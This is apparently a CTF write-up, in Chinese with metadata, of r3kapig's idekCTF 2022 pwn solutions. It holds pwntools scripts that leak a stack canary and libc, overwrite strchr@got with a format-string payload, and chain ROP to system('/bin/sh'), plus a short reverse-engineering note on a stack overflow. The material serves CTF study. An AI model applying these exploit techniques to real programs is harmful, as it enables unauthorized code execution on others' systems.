---
title: idek 2022: Pwn && Reverse Writeup by r3kapig
contest: idekCTF
year: 2022
difficulty: hard
vuln_type: pwn_unknown
tags: [fmt-string, canary-leak, stack-leak, ret2dlresolve, fmt-arg-overlap, glibc-2.31]
attack_chain:
  - 'y' 进 survey
  - 'a'*11 输入泄 canary (8 字节覆盖)
  - 'a'*10 覆盖 canary 控 ret
  - 'a'*0x1a 泄 textaddr
  - 改返回地址 + 0x1273 偏移
  - leak_payload: pop rdi + fgets@got + printf@plt
  - 泄 libc
  - system("/bin/sh")
  - sprinter: fmt-string + 任意地址写
  - %9$hhn / %31$hhn / %33$n / %34$hhn 改写 strchr@got
  - ROP 链 system
key_payload: 格式化字符串 %9$hhn + canary 泄 + ret2dlresolve
one_liner: idekCTF 2022 r3kapig 战队 Pwn + Reverse 套题，survey 泄 canary + fmt-string 任意写。
lesson: 多步 fmt-string 利用要先泄 canary 再泄 textaddr 才能构造 ret 链。
quality: high
---

idekCTF 2022 r3kapig 战队 Pwn + Reverse 套题。

**survey 套题（栈 + 格式化串）**

```python
sla('Do you want to complete a survey?', 'y')

# 1. 泄 canary
sa('Do you like ctf?', 'a'*11)
ru('a'*10)
canary = u64(p.recv(8).ljust(8, '\x00')) - 0x61

# 2. 泄栈地址
sa('Can you provide some extra feedback?', 'a'*10 + p64(canary))
stackaddr = u64(p.recv(6).ljust(8, '\x00'))

# 3. 泄 textaddr (PIE 关闭后才需要，开了则要 leak)
sla('Do you want to complete a survey?', 'y')
sa('Do you like ctf?', 'a'*0x1a)
ru('a'*0x1a)
textaddr = u64(p.recv(6).ljust(8, '\x00')) - 0x1447

# 4. 改 ret 到目标 0x1273 + textaddr
target = 0x1273 + textaddr
sa('Can you provide some extra feedback?',
   'a'*10 + p64(canary) + p64(stackaddr+0x6c) + p64(target) +
   'a\x00\x00\x00' + 'l\x00\x00\x00' + 'f\x00\x00\x00')
```

**sprinter 题（fmt-string 高级利用）**

```python
r.recvuntil(b"Enter your string into my buffer, located at ")
stack_addr = int(r.recvuntil(b':')[:-1], 16)
target_addr = stack_addr - 8

# 4 段 fmt-string payload + 末尾 4 个 8 字节地址
payload = b'%s' + b'a\x00' + b'%%' + b'b'*3 + b'c%9$hhn' +
          b'b%31$hhn' + b'%' + b'b'*5 + b'c%33$hhn' + b'%' + b'b'*(0x30-5) + b'c%34$n' + b'%' + b'b'*(0x26+0xc-2) + b'c%32$hhn'
payload = payload.ljust(0xd0, b'\x00')
payload += p64(target_addr) + p64(elf.got["strchr"]) + p64(elf.got["strchr"]+1) + p64(elf.got["strchr"]+2)

r.sendline(payload)
# 触发 ret2dlresolve → leak fgets@got → 算 libc base
pop_rdi = 0x0000000000401373
leak_payload = p64(pop_rdi) + p64(elf.got["fgets"]) + p64(elf.plt["printf"]) + p64(0x40122F)
r.sendline(leak_payload)
libc_base = u64(r.recvuntil(b'\x7f')[-6:].ljust(0x8, b'\x00')) - libc.sym["fgets"]
system_addr = libc_base + libc.sym["system"]

# 改 ret → system("/bin/sh")
r.sendline(b'/bin/sh\x00' + b'a'*0x10 + p64(pop_rdi+1) + p64(pop_rdi) + p64(stack_addr) + p64(system_addr))
r.interactive()
```

**Reverse 题：Task SendAllAsyncNewline**
C++ 代码：
```cpp
Task SendAllAsyncNewline(io_context& ctx, int socket, std::span<std::byte> buffer) {
    std::byte buffer2[513];
    printf("SendAllAsyncNewline buffer: %p\n", buffer.data());
    printf("SendAllAsyncNewline buffer2: %p\n", buffer2);
    std::copy(buffer.begin(), buffer.end(), buffer2);
    buffer2[buffer.size()] = std::byte(0);
    // ... async write
}
```
- `buffer` 是堆地址（用户输入）
- `buffer2[513]` 栈地址与存放 flag 的栈帧重叠
- 复制 513 字节 → 栈溢出 → ROP

**核心技巧**：
- 格式化字符串 %N$hhn 字节级写
- %N$n 8 字节写
- 多步覆盖 canary → textaddr → ret 三阶段
- ret2dlresolve + 动态解析函数地址

适合作为"中等难度 Pwn 综合 + 高级 fmt-string 实战"教材。
